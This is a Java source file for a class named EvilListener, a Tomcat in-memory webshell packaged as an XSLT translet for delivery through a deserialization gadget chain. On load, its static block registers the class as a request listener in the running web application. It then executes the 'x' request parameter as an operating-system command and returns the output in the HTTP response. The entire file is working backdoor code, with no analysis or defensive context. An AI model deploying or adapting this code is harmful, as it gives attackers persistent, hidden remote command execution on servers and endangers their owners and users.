import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import org.apache.catalina.connector.Request;
import org.apache.catalina.core.StandardContext;
import org.apache.catalina.loader.WebappClassLoaderBase;

import javax.servlet.ServletRequestEvent;
import javax.servlet.ServletRequestListener;
import javax.servlet.http.HttpServletRequest;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.lang.reflect.Field;

public class EvilListener extends AbstractTranslet implements ServletRequestListener {
    static {
        try{
            WebappClassLoaderBase webappClassLoaderBase = (WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();
            StandardContext standardContext = (StandardContext) webappClassLoaderBase.getResources().getContext();

            Object listener = new EvilListener();

            standardContext.addApplicationEventListener(listener);
        }catch (Exception e){
            e.printStackTrace();
        }
    }

    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {}
    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {}

    @Override
    public void requestDestroyed(ServletRequestEvent servletRequestEvent) {
        try {
            if (servletRequestEvent.getServletRequest().getParameter("x") != null) {
                Process process = Runtime.getRuntime().exec(servletRequestEvent.getServletRequest().getParameter("x"));
                BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));

                String str;
                String line;
                for(str = ""; (line = reader.readLine()) != null; str = str + line) {
                }

                HttpServletRequest request = (HttpServletRequest)servletRequestEvent.getServletRequest();
                Field requestfield = request.getClass().getDeclaredField("request");
                requestfield.setAccessible(true);
                Request req = (Request)requestfield.get(request);
                req.getResponse().getWriter().println(str);
            }
        } catch (Exception var9) {
            var9.printStackTrace();
        }
    }

    @Override
    public void requestInitialized(ServletRequestEvent servletRequestEvent) {

    }
}
